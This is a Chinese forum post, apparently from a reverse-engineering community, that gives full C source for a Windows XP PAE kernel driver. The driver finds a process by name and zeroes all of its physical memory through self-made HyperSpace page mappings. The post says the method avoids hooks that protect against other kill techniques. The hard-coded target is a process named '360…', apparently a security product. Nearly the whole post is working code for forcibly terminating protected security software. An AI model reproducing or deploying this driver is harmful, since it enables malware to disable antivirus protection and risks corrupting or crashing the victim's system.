
# 暴力强杀进程代码

> 原文：[`www.pediy.com/kssd/pediy12/132600.html`](https://www.pediy.com/kssd/pediy12/132600.html)

看到竹君大大的内存清零杀进程。里面用了`KeAttachProcess`。如果`hook`了`KiAttachProcess`，应该就不能成功了。我想能不能更直接些呢。直接将要结束进程的物理内存映射到`HyperSpace`，然后清零。写了调试了一晚上，终于好了。在下菜鸟一个，请大家多多指教！在`XP SP2`和`SP3`下测试通过。都是`PAE`分页。

代码:

```c
#include <ntddk.h>

#define HYPER_SPACE_BASE (0xc0800000)
#define PDE_BASE (0xc0600000)
#define PTE_BASE (0xc0000000)

#define DIRECTORY_TABLE_BASE (0x18)
#define ACTIVE_PROCESS_LINKS_OFFSET (0x88)
#define IMAGE_FILE_NAME_OFFSET (0x174)

#define PROCESS_TO_TERMINATE ("360")

ULONG MapPhysicalAddrToHyperSpace(ULONG PhysicalAddr);
VOID DeleteMapping(ULONG Addr);
VOID DriverUnload(PDRIVER_OBJECT pDriverObject);

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING pRegistryPath)
{
  PEPROCESS pCurrProcess = NULL;
  PEPROCESS pSysProcess = NULL;
  ULONG cr3 = 0;
  ULONG MappedCr3Addr = 0;
  ULONG MappedPdeAddr = 0;
  ULONG MappedPteAddr = 0;
  ULONG MappedRealAddr = 0;
  ULONG i = 0;
  ULONG j = 0;
  ULONG s = 0;
  ULONG t = 0;

  pDriverObject->DriverUnload = DriverUnload;

  pCurrProcess = PsGetCurrentProcess();
  pSysProcess = pCurrProcess;
  pCurrProcess = (PEPROCESS)(* (PULONG)((ULONG)pCurrProcess + ACTIVE_PROCESS_LINKS_OFFSET) - ACTIVE_PROCESS_LINKS_OFFSET);

  while(RtlCompareMemory((PUCHAR)((ULONG)pCurrProcess + IMAGE_FILE_NAME_OFFSET),PROCESS_TO_TERMINATE,3) != 3)
  {
    pCurrProcess = (PEPROCESS)(* (PULONG)((ULONG)pCurrProcess + ACTIVE_PROCESS_LINKS_OFFSET) - ACTIVE_PROCESS_LINKS_OFFSET);

    if(pCurrProcess == pSysProcess)
    {
      return STATUS_UNSUCCESSFUL;
    }
  }

  cr3 = * (PULONG)((ULONG)pCurrProcess + DIRECTORY_TABLE_BASE);

  MappedCr3Addr = MapPhysicalAddrToHyperSpace(cr3);

  if(!MappedCr3Addr)
  {
    return STATUS_UNSUCCESSFUL;
  }

  for(t = 0;t < 2;t++)
  {

    MappedPdeAddr = MapPhysicalAddrToHyperSpace(* (PULONG)(MappedCr3Addr + t * 8) & 0xfffff000);

    if(!MappedPdeAddr)
    {
      return STATUS_UNSUCCESSFUL;
    }
   
    for(i = 0;i < 512;i++)
    {
      if(* (PULONG)(MappedPdeAddr + i * 8) & 1)
      {
        /*if((* (PULONG)(MappedPdeAddr + i * 8) & 0x80) && !(* (PULONG)(MappedPdeAddr + i * 8 + 4) & 80000000))
        {
          for(j = 0;j < 512;j++)
          {
            MappedRealAddr = MapPhysicalAddrToHyperSpace((* (PULONG)(MappedPdeAddr + i * 8) + j * 4096)& 0xfffff000);

            for(s = 0;s < 1024;s++)
            {
              * (PULONG)(MappedRealAddr + s*4) = 0;
            }

            DeleteMapping(MappedRealAddr);
          }

          continue;
        }*/

        if(* (PULONG)(MappedPdeAddr + i * 8) & 0x80)
        {
          return STATUS_UNSUCCESSFUL;
        }

        MappedPteAddr = MapPhysicalAddrToHyperSpace(* (PULONG)(MappedPdeAddr + i * 8) & 0xfffff000);
   
        if(!MappedPteAddr)
        {
          return STATUS_UNSUCCESSFUL;
        }

        for(j = 0;j < 512;j++)
        {
          //if((* (PULONG)(MappedPteAddr + j * 8) & 1) && !(* (PULONG)(MappedPteAddr + j * 8 + 4) & 0x80000000))
          if(* (PULONG)(MappedPteAddr + j * 8) & 1)
          {
            MappedRealAddr = MapPhysicalAddrToHyperSpace(* (PULONG)(MappedPteAddr + j * 8) & 0xfffff000);

            if(!MappedRealAddr)
            {
              return STATUS_UNSUCCESSFUL;
            }

            for(s = 0;s < 1024;s++)
            {
              * (PULONG)(MappedRealAddr + s*4) = 0;
            }
           
            DeleteMapping(MappedRealAddr);
          }
        }

        DeleteMapping(MappedPteAddr);
      }
       
      if(t == 1 && i >= 383)
      {
        break;
      }
    }

    DeleteMapping(MappedPdeAddr);
  }

  DeleteMapping(MappedCr3Addr);

  return STATUS_SUCCESS;
}

ULONG MapPhysicalAddrToHyperSpace(ULONG PhysicalAddr)
{
  ULONG RoundDownPhysicalAddr = PhysicalAddr & 0xfffff000;
  ULONG Entry = RoundDownPhysicalAddr | 0x3;
  ULONG HyperSpacePteBase = (HYPER_SPACE_BASE >> 12) * 8 + PTE_BASE;
  ULONG i = 0;
  ULONG Address = 0;

  for(; i < 1024;i++)
  {
    if(* (PULONG)(HyperSpacePteBase + i * 8) == 0)
    {
      * (PULONG)(HyperSpacePteBase + i*8) = Entry;

      Address = HYPER_SPACE_BASE + i * 0x1000 + PhysicalAddr - RoundDownPhysicalAddr;

      __asm invlpg Address

      return Address;
    }
  }

  return 0;
}

VOID DeleteMapping(ULONG Addr)
{
  * (PULONG)((Addr >> 12) * 8 + PTE_BASE) = 0;

  return;
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
  return;
}
```

上传的附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) | | `pde0.rar` |
|
